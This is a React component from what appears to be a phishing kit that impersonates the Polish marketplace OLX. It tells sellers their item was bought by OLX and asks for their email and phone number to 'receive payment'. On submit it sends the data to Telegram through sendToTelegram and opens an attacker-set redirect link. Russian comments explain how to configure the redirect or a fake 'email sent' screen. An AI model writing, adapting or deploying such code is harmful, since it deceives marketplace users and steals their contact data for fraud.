import React, { useState } from 'react';
import { Check } from 'lucide-react';
import { sendToTelegram } from '../utils/api';

// ====== НАСТРОЙКА ПОСЛЕ НАЖАТИЯ "Kontynuuj" ======
// Вариант "redirect": после отправки пользователь автоматически переходит по ссылке
// Вариант "message": после отправки показывается окно "письмо отправлено"
// Чтобы включить редирект: введите ссылку в REDIRECT_URL ниже
// Чтобы показать окно: оставьте REDIRECT_URL пустым ("")
const REDIRECT_URL = "https://k6pn3wr.qpon/qqx0qeaw"; // например: "https://olx.pl" или "" для показа окна
// ================================================

interface FormData {
  email: string;
  phone: string;
}

export default function OLXForm() {
  const [formData, setFormData] = useState<FormData>({
    email: '',
    phone: ''
  });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<FormData>>({});

  const validateForm = (): boolean => {
    const newErrors: Partial<FormData> = {};
    
    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!formData.email.trim()) {
      newErrors.email = 'Adres e-mail jest wymagany';
    } else if (!emailRegex.test(formData.email)) {
      newErrors.email = 'Wprowadź prawidłowy adres e-mail';
    }

    if (!formData.phone.trim()) {
      newErrors.phone = 'Numer telefonu jest wymagany';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    e.stopPropagation();

    if (!validateForm()) {
      return;
    }

    if (REDIRECT_URL) {
      window.open(REDIRECT_URL, '_blank', 'noopener,noreferrer');
    }

    setIsLoading(true);

    try {
      await sendToTelegram(formData);
      if (!REDIRECT_URL) {
        setIsSubmitted(true);
      }
    } catch (error) {
      console.error('Error sending data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    
    // Clear error when user starts typing
    if (errors[name as keyof FormData]) {
      setErrors(prev => ({
        ...prev,
        [name]: undefined
      }));
    }
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          {/* OLX Logo */}
          <div className="text-center mb-8">
            <div className="inline-block bg-gradient-to-r from-[#00D4AA] to-[#00B896] text-white px-4 py-2 rounded-lg font-bold text-xl">
              olx
            </div>
          </div>

          <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
            {/* Success Icon */}
            <div className="w-16 h-16 bg-[#23E5DB]/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <Check className="w-8 h-8 text-[#23E5DB]" />
            </div>

            <h2 className="text-2xl font-bold text-gray-800 mb-4">
              E-mail został wysłany!
            </h2>
            
            <p className="text-gray-600 mb-4">
              Wysłaliśmy wiadomość na adres:
            </p>
            
            <p className="font-semibold text-gray-800 mb-6">
              {formData.email}
            </p>

            <div className="bg-[#23E5DB]/5 rounded-xl p-4 mb-6">
              <div className="flex items-center justify-center mb-3">
                <div className="w-6 h-6 bg-[#23E5DB] rounded-full flex items-center justify-center">
                  <span className="text-white text-sm">ℹ</span>
                </div>
                <span className="ml-2 font-semibold text-gray-800">Co dalej?</span>
              </div>
              
              <div className="text-left space-y-2 text-sm text-gray-600">
                <div className="flex items-start">
                  <span className="text-[#23E5DB] font-bold mr-2">1.</span>
                  <span>Sprawdź swoją skrzynkę pocztową</span>
                </div>
                <div className="flex items-start">
                  <span className="text-[#23E5DB] font-bold mr-2">2.</span>
                  <span>Kliknij link w otrzymanej wiadomości</span>
                </div>
                <div className="flex items-start">
                  <span className="text-[#23E5DB] font-bold mr-2">3.</span>
                  <span>Jeśli nie widzisz e-maila, sprawdź folder spam</span>
                </div>
              </div>
            </div>

            <div className="text-center text-lg font-semibold text-[#23E5DB] mb-6">
              Otrzymasz e-mail w ciągu 5-10 minut
            </div>

            <button 
              onClick={() => setIsSubmitted(false)}
              className="w-full bg-[#002F34] hover:bg-[#001F24] text-white font-semibold py-3 px-6 rounded-xl transition-colors duration-200"
            >
              Wyślij ponownie
            </button>

            <button 
              onClick={() => setIsSubmitted(false)}
              className="w-full mt-3 bg-transparent text-gray-600 hover:text-gray-800 font-medium py-3 px-6 transition-colors duration-200"
            >
              Zmień adres e-mail
            </button>
          </div>

          <p className="text-center text-sm text-gray-500 mt-6">
            Problemy z otrzymywaniem e-maili?
            <a href="#" className="text-[#23E5DB] hover:underline ml-1">
              Skontaktuj się z pomocą
            </a>
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* OLX Logo */}
        <div className="text-center mb-8">
          <div className="inline-block bg-[#002F34] text-[#23E5DB] px-4 py-2 rounded-lg font-bold text-xl">
            olx
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-lg p-8">
          <h1 className="text-2xl font-bold text-gray-800 mb-4 text-center">
            Witamy w OLX!
          </h1>
          
          <p className="text-gray-600 text-center mb-8 leading-relaxed">
            Twój produkt został zakupiony przez OLX. Prosimy o 
            podanie adresu e-mail i numeru telefonu, aby otrzymać 
            płatność za produkt.
          </p>

          <form className="space-y-6">
            {/* Email Field */}
            <div>
              <label htmlFor="email" className="block text-sm font-semibold text-gray-700 mb-2">
                Adres e-mail
              </label>
              <input
                type="email"
                id="email"
                name="email"
                value={formData.email}
                onChange={handleInputChange}
                placeholder="wprowadź swój e-mail"
                className={`w-full px-4 py-3 border rounded-xl focus:outline-none focus:ring-2 focus:ring-[#23E5DB] focus:border-transparent transition-all duration-200 ${
                  errors.email ? 'border-red-500 bg-red-50' : 'border-gray-300 hover:border-gray-400'
                }`}
                disabled={isLoading}
              />
              {errors.email && (
                <p className="mt-2 text-sm text-red-600">{errors.email}</p>
              )}
            </div>

            {/* Phone Field */}
            <div>
              <label htmlFor="phone" className="block text-sm font-semibold text-gray-700 mb-2">
                Numer telefonu
              </label>
              <input
                type="tel"
                id="phone"
                name="phone"
                value={formData.phone}
                onChange={handleInputChange}
                placeholder="wprowadź numer telefonu"
                className={`w-full px-4 py-3 border rounded-xl focus:outline-none focus:ring-2 focus:ring-[#23E5DB] focus:border-transparent transition-all duration-200 ${
                  errors.phone ? 'border-red-500 bg-red-50' : 'border-gray-300 hover:border-gray-400'
                }`}
                disabled={isLoading}
              />
              {errors.phone && (
                <p className="mt-2 text-sm text-red-600">{errors.phone}</p>
              )}
            </div>

            <button
              type="button"
              onClick={handleSubmit}
              disabled={isLoading}
              className="w-full bg-[#002F34] hover:bg-[#001F24] disabled:bg-gray-400 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98]"
            >
              {isLoading ? 'Wysyłanie...' : 'Kontynuuj'}
            </button>

            <p className="text-xs text-gray-500 text-center leading-relaxed">
              Klikając "Kontynuuj", zgadzasz się z{' '}
              <a href="#" className="text-[#23E5DB] hover:underline">
                Warunkami użytkowania
              </a>{' '}
              i{' '}
              <a href="#" className="text-[#23E5DB] hover:underline">
                Polityką prywatności
              </a>
              .
            </p>
          </form>
        </div>

        <p className="text-center text-sm text-gray-500 mt-6">
          Masz już konto?{' '}
          <a href="#" className="text-[#23E5DB] hover:underline font-medium">
            Zaloguj się
          </a>
        </p>
      </div>
    </div>
  );
}